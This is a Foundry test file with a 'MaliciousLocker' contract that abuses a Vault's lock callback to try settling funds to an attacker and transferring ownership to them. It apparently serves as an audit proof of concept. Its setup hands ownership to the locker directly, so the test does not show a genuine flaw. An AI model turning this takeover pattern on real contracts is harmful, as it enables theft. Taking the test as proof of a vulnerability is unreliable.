// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/interfaces/ILockCallback.sol";

contract MaliciousLocker is ILockCallback {
    Vault public vault;
    address public attacker;

    constructor(address _vault, address _attacker) {
        vault = Vault(_vault);
        attacker = _attacker;
    }

    function triggerLock() external {
        vault.lock(""); // locker becomes msg.sender
    }

    function lockAcquired(bytes calldata) external override returns (bytes memory) {
        console.log("Callback triggered");

        try vault.settleFor(attacker) {
            console.log("Settle succeeded");
        } catch {
            console.log("Settle failed");
        }

        try vault.transferOwnership(attacker) {
            console.log("Ownership transferred");
        } catch {
            console.log("Ownership transfer failed");
        }

        return "";
    }
}

contract VaultExploitTest is Test {
    Vault vault;
    MaliciousLocker locker;
    address attacker = address(0xBEEF);

    function setUp() public {
        vault = new Vault();
        locker = new MaliciousLocker(address(vault), attacker);

        bytes32 lockerSlot = hex"edda7c051899c54dd66eaf5e13c031326ab93fd313d70000";
        bytes32 lockerAddress = bytes32(uint256(uint160(address(locker))));
        vm.store(address(vault), lockerSlot, lockerAddress);

        vault.transferOwnership(address(locker)); // step 1: legit owner sets locker as pendingOwner
        vm.prank(address(locker));
        vault.acceptOwnership();                  // step 2: locker becomes owner
    }

    function testExploit() public {
        locker.triggerLock();                     // locker now owns the vault
        vm.prank(attacker);
        vault.acceptOwnership();                  // attacker accepts ownership
        assertEq(vault.owner(), attacker);
    }
}
